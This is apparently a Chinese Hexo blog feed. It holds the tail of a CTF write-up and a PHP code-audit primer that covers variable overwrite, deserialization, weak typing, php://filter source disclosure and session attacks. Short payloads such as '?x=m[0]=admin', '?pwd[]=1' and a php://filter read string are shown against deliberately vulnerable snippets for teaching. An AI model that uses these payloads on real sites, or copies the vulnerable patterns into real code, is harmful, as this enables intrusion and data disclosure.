用于修改表中字段的属性</li></ol></li><li><p>攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了</p></li></ol><h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平台：&lt;a href=&quot;https://buuoj.cn/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://buuoj.cn/challenges&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2019 强网杯的题目总结&lt;/p&gt;
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="QWB" scheme="http://yoursite.com/tags/QWB/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计基础</title>
    <link href="http://yoursite.com/2019/06/03/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2019/06/03/PHP代码审计基础/</id>
    <published>2019-06-03T10:58:57.814Z</published>
    <updated>2019-08-27T15:37:28.756Z</updated>
    
    <content type="html"><![CDATA[<p>代码审计入门的小总结</p><a id="more"></a><h1 id="常见-PHP-框架"><a href="#常见-PHP-框架" class="headerlink" title="常见 PHP 框架"></a>常见 PHP 框架</h1><ul><li>ThinkPHP</li><li>Yaf</li><li>Laravel</li><li>Kohana</li><li>Codelgniter</li><li>Yii</li><li>Smyfony</li><li>doitphp</li></ul><blockquote><p>先看用户手册</p></blockquote><h1 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h1><p>获取请求 =》全局过滤 =》模块文件 =》C函数内容 =》M函数内容 =》V显示</p><h1 id="网站目录结构"><a href="#网站目录结构" class="headerlink" title="网站目录结构"></a>网站目录结构</h1><ul><li><p>主目录</p></li><li><p>模块目录</p></li><li><p>插件目录</p></li><li><p>上层目录</p></li><li><p>模板目录</p></li><li><p>数据目录</p></li><li><p>配置目录</p></li><li><p>配置文件</p></li><li><p>公共函数文件</p></li><li><p>安全过滤文件</p></li><li><p>数据库结构</p></li><li><p>入口文件</p></li></ul><h1 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h1><h2 id="通读原文"><a href="#通读原文" class="headerlink" title="通读原文"></a>通读原文</h2><ul><li>函数集文件</li><li>配置文件</li><li>安全过滤文件</li><li>index 文件</li></ul><blockquote><p>适用于比较小的网站或者 CMS</p></blockquote><h2 id="敏感关键字回溯参数"><a href="#敏感关键字回溯参数" class="headerlink" title="敏感关键字回溯参数"></a>敏感关键字回溯参数</h2><p>这是常见方法，但是不能了解程序的基本框架，覆盖不了逻辑漏洞</p><h2 id="查找可控变量"><a href="#查找可控变量" class="headerlink" title="查找可控变量"></a>查找可控变量</h2><ul><li><p>可控变量</p></li><li><p>进入函数的变量</p></li></ul><h2 id="功能点定向审计"><a href="#功能点定向审计" class="headerlink" title="功能点定向审计"></a>功能点定向审计</h2><ul><li>程序安装</li><li>文件上传</li><li>文件管理</li><li>登陆验证</li><li>备份恢复</li><li>找回密码</li></ul><h1 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ul><li>大小写敏感</li><li>运算符：|, &amp;, ~, !</li><li>空值：foo = ; 或者 foo = none;</li></ul><h2 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h2><ul><li><p>安全模式</p><p><code>safe_mode = off</code></p><p>限制文档的存取，限制环境变量的存取，控制外部程序的执行</p><p>在 PHP5.4.0 被移除</p></li><li><p>限制环境变量存取</p><p><code>safe_mode_allowed_env_vars = string</code></p><p>指定 PHP 程序可以改变的环境变量的前缀</p></li><li><p>外部程序执行目录</p><p><code>safe_mode_exec_dir = &quot;path&quot;</code></p></li><li><p>禁用函数</p><p><code>disable_functions =</code> </p></li></ul><h2 id="控制变量"><a href="#控制变量" class="headerlink" title="控制变量"></a>控制变量</h2><ul><li><p>全局变量注册开关</p><p><code>register_globals = off</code></p><p>off 时服务端使用 $_GET[‘name’] 获取数据，on 时服务端通过 POST 或 GET 提交的数据将使用全局变量来接收</p></li><li><p>魔术引号自动过滤</p><p><code>magic_quotes_gpc = on</code></p><p>在 PHP5.4.0 被移除</p></li></ul><h2 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h2><ul><li><p>是否允许包含远程文件</p><p><code>allow_url_include = off</code></p></li><li><p>是否允许打开远程文件</p><p><code>allow_url_open = off</code></p></li></ul><h2 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h2><ul><li><p>HTTP 头部版本信息</p><p><code>expose_http = off</code></p></li><li><p>文件上传临时目录</p><p><code>upload_tmp_dir =</code> </p></li><li><p>用户可访问目录</p><p><code>open_basedir = path</code></p></li></ul><h2 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h2><ul><li><p>内部错误选项</p><p><code>display_errors = on</code></p></li><li><p>错误报告级别</p><p><code>error_reporting = E_ALL&amp;~E_NOTICE</code></p></li></ul><h1 id="审计中涉及的超全局变量"><a href="#审计中涉及的超全局变量" class="headerlink" title="审计中涉及的超全局变量"></a>审计中涉及的超全局变量</h1><ul><li><p>全局变量</p><p>在函数外面定义的变量，不能在函数中直接使用。在函数中使用时加上global</p></li><li><p>超全局变量</p><p>作用域在所有脚本，比如$_GET，$_SERVER。除$_GET, $_POST, $_SERVER, $_COOKIE等之外的超全局变量保存在 $GLOBALS 数组中</p></li></ul><h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h2><ul><li><p>global</p><p>定义全局变量，只应用于当前网页而不是整个网站，可以视为参数的传递</p></li><li><p>$GLOBALS</p><p>在 PHP 脚本中的任意位置访问全局变量，可以视为变量的作用域设置全局</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var1 = <span class="number">1</span>;</span><br><span class="line">$var2 = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'var1'</span>] = $GLOBALS[<span class="string">'var2'</span>];</span><br><span class="line">&#125;</span><br><span class="line">test1();</span><br><span class="line"><span class="keyword">echo</span> $var1;<span class="comment">//2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $var1,$var2;</span><br><span class="line">$var1 = $var2</span><br><span class="line">&#125;</span><br><span class="line">test2();</span><br><span class="line"><span class="keyword">echo</span> $var1;<span class="comment">//2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="POST-和-GET"><a href="#POST-和-GET" class="headerlink" title="$_POST 和 $_GET"></a>$_POST 和 $_GET</h2><ul><li><p>POST</p><p>隐藏传参，将表单内各个字段与其内容放在 Request Header 内传给服务器</p></li><li><p>GET</p><p>URL 传参，将参数放在提交表单的 ACTION 属性所指的 URL 中</p></li></ul><h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><ul><li>PHP 中 $_REQUEST 可以获取 以 POST 和 GET 方法提交的数据</li><li>尽量不要使用</li></ul><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><ul><li>这种超全局变量保存关于报头、路径和脚本位置的信息</li><li>是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</li><li>数组</li></ul><h2 id="FILE"><a href="#FILE" class="headerlink" title="$_FILE"></a>$_FILE</h2><ul><li>保存上传文件的信息</li><li>数组</li></ul><h2 id="SESSION"><a href="#SESSION" class="headerlink" title="$_SESSION"></a>$_SESSION</h2><ul><li>保存 SESSION 信息</li><li>数组</li></ul><h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h2><ul><li>保存 COOKIE 信息</li><li>数组</li></ul><h2 id="ENV"><a href="#ENV" class="headerlink" title="$_ENV"></a>$_ENV</h2><ul><li>包含服务器环境变量的数组</li><li>只是被动的接受服务器端的环境变量转换为数组</li></ul><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><ul><li>变量未初始化，我们自定义的参数值可以替换程序原有的变量值</li></ul><h2 id><a href="#" class="headerlink" title="$$"></a>$$</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x = <span class="string">'123'</span>;</span><br><span class="line">$b = <span class="string">'456'</span>;</span><br><span class="line"></span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$x);"</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($x);"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量 x 初始化为 ‘123’</p><p>传入参数 ?x=b，$$x 就相当于 $b，这时的输出为 string(3) “456”，string(1) “b”</p><p>传入参数 ?x=x=789，$$x 相当于 ${x=789}，这时输出为 int(789)，int(789)，x 值以被覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">$_403 = <span class="string">"Access Denied"</span>;</span><br><span class="line">$_200 = <span class="string">"Welcome Admin"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"CTF is here :p…"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $$value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</span><br><span class="line">    <span class="keyword">die</span>($_403);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is your flag : "</span>. $flag . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($_200);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：?_200=flag post：flag=1</p><p>通过 $$key=$$value 将 flag 的值赋给 _200，post 中的 flag 为：${flag}=1，所以 post 的值永远和 $flag 相同，接着利用 die($_200) 将真实的 flag 输出</p><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h2><blockquote><p>extract(<em>array,extract_rules,prefix</em>)</p></blockquote><p>extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，创建这些变量。该函数返回成功设置的变量数目。</p><p>extract_rules 参数：</p><ul><li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</li><li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li><li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</li><li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。</li><li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。</li><li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li><li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li><li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"Original"</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"Cat"</span>, <span class="string">"b"</span> =&gt; <span class="string">"Dog"</span>, <span class="string">"c"</span> =&gt; <span class="string">"Horse"</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">extract($my_array);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$a = $a; \$b = $b; \$c = $c"</span>;</span><br><span class="line"><span class="comment">//Original $a = Cat; $b = Dog; $c = Horse</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>]==<span class="string">"POST"</span>)&#123;</span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">if</span>($pass == $password_hard)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"peri0d"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：post：pass=123&amp;password_hard=123</p><p>传入的 $_POST 是一个数组，为 <code>array(2) {[&quot;pass&quot;]=&gt;string(3) &quot;123&quot; [&quot;password_hard&quot;]=&gt;string(3) &quot;123&quot;}</code></p><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><blockquote><p>parse_str(<em>string,array</em>)</p></blockquote><p>parse_str() 函数把查询字符串解析到变量中。如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = <span class="string">'peri0d'</span>;</span><br><span class="line">parse_str(<span class="string">'name=peri0d_2&amp;sex=1'</span>);</span><br><span class="line"><span class="keyword">echo</span> $name.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sex;</span><br><span class="line"><span class="comment">//peri0d_21</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'x'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">    $m = <span class="string">"guest"</span>;</span><br><span class="line">    $x = $_GET[<span class="string">'x'</span>];</span><br><span class="line">    @parse_str($x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($m[<span class="number">0</span>] == <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"so easy!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：?x=m[0]=admin</p><p>parse_str($x) 即为 parse_str(m[0]=admin)，实现变量覆盖。</p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><ul><li>序列化：把一个复杂的数据类型压缩为一个字符串</li><li>反序列化：把一个字符串恢复成复杂的数据类型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x = &quot;peri0d 2019&quot;;</span><br><span class="line">$y = array(&quot;peri0d&quot;,2019);</span><br><span class="line">echo serialize($x).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo serialize($y);</span><br><span class="line">//s:11:&quot;peri0d 2019&quot;;</span><br><span class="line">//a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;i:2019;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul><li>反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，漏洞根据不同的代码可以导致各种攻击</li><li>unserialize 函数的变量可控</li><li>php 文件存在可利用的类，类中有魔术方法</li></ul><h2 id="序列化的不同结果"><a href="#序列化的不同结果" class="headerlink" title="序列化的不同结果"></a>序列化的不同结果</h2><ul><li>public</li><li>private</li><li>protect</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $x = <span class="string">"peri0dx"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $y = <span class="string">"peri0dy"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $z = <span class="string">"peri0dz"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($t);</span><br><span class="line"><span class="comment">//O:4:"test":3:&#123;s:7:"testx";s:7:"peri0dx";s:1:"y";s:7:"peri0dy";s:4:"*z";s:7:"peri0dz";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul><li>construct() : 当一个类被创建时自动调用</li><li>destruct() : 当一个类被销毁时自动调用</li><li>invoke() : 当把一个类当作函数使用时自动调用</li><li>toString() : 当把一个类当作字符串使用时自动调用</li><li>wakeup() : 当调用unserialize()函数时自动调用</li><li>sleep() : 当调用serialize()函数时自动调用</li><li>call() : 当要调用的方法不存在或权限不足时自动调用</li><li>get() : 这个方法用来获取私有成员属性值的,有一个参数，参数传入你要获取的成员属性的名称，返回获取的属性值</li><li>set() : 将数据写入不可访问属性</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/magic_method.png" alt></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>CVE-2016-7124</p><h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><ul><li>标准类型：布尔，整型，浮点，字符</li><li>复杂类型：数据，对象</li><li>特殊类型：资源</li></ul><h2 id="操作之间的比较"><a href="#操作之间的比较" class="headerlink" title="操作之间的比较"></a>操作之间的比较</h2><ol><li><p>字符串和数字</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">"admin"</span>);    <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span> == <span class="number">1</span>);   <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span> == <span class="number">1</span>);   <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span> == <span class="number">0</span>);   <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>数字和数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">var_dump(<span class="number">0</span> == $arr);    <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="number">123</span> == $arr);  <span class="comment">//F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>字符串和数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">var_dump(<span class="string">'0'</span> == $arr);    <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">'123'</span> == $arr);  <span class="comment">//F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>“合法数字+e+合法数字” 类型的字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"0e1234"</span> == <span class="string">"0e56789"</span>);   <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"1e1123"</span> == <span class="string">"10"</span>);        <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">"1e1"</span> == <span class="string">"10"</span>);           <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>== 和 ===</p><p>在PHP里面    ==   比较指比较值，不同类型会转换成同一类型比较。用   ===   比较时，必须值和类型都一样才为true</p></li></ol><h2 id="empty-与-isset"><a href="#empty-与-isset" class="headerlink" title="empty 与 isset"></a>empty 与 isset</h2><ul><li>变量为：0, “0”, null, false, array() 时，使用 empty 函数，返回值为 true</li><li>变量未定义或为 null 时，isset 函数返回 false，其他都返回 true</li></ul><h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5 函数"></a>md5 函数</h2><p>传入数组进行比较时全为 true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr1 = <span class="keyword">array</span>(<span class="string">'test1'</span>, <span class="string">'test2'</span>, <span class="string">'2019'</span>);</span><br><span class="line">$arr2 = <span class="keyword">array</span>(<span class="string">'test3'</span>, <span class="string">'test4'</span>, <span class="string">'2019'</span>);</span><br><span class="line">var_dump(md5($arr1) == md5($arr2));    <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp 函数"></a>strcmp 函数</h2><blockquote><p>strcmp(<em>string1</em>, <em>string2</em>)</p></blockquote><p>比较 string1 和 string2。如果相等返回 0；如果 string1 小于 string2，返回 &lt;0；如果 string1 大于 string2，返回 &gt;0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass = <span class="string">'123456'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strcmp($_GET[<span class="string">'pwd'</span>], $pass) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'fail'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：?pwd[]=1</p><h2 id="in-array-与-array-search"><a href="#in-array-与-array-search" class="headerlink" title="in_array() 与 array_search()"></a>in_array() 与 array_search()</h2><p><strong>in_array()</strong> 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE。</p><blockquote><p>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</p></blockquote><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/in_array.png" alt></p><p><strong>array_search()</strong> 函数在数组中搜索某个键值，并返回对应的键名。如果在数组中找到指定的键值，则返回对应的键名，否则返回 FALSE。如果在数组中找到键值超过一次，则返回第一次找到的键值所匹配的键名。</p><blockquote><p>array_search(<em>value</em>, <em>array</em>, <em>strict</em>) </p></blockquote><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/array_search.png" alt></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p>如果 switch 是数字类型的 case 判断时，switch 会将参数转换为 int 类型</p><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><ul><li>用于访问本地系统文件，不受 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong> 影响</li><li>常与文件包含结合在一起使用</li></ul><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><ul><li>读取源代码并以base-64编码形式输出，不受 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong> 影响</li><li>常与文件包含结合在一起使用</li><li>经典用法：?file=php://filter/read=convert.base64-encode/resource=./index.php</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/filter.png" alt></p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><ul><li>可以访问请求的原始数据的只读流，<strong>allow_url_include</strong> 为 on 时可以使用，不受 <strong>allow_url_fopen</strong> 影响</li></ul><h1 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h1><ul><li>Session 固定攻击</li><li>Session 劫持攻击</li><li>通常出现在 cookie 验证上，通常不使用 session 认证</li></ul><h2 id="Session-劫持攻击"><a href="#Session-劫持攻击" class="headerlink" title="Session 劫持攻击"></a>Session 劫持攻击</h2><ul><li>获取用户的 session id，然后修改数据</li></ul><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/session_1.png" alt></p><h2 id="Session-固定攻击"><a 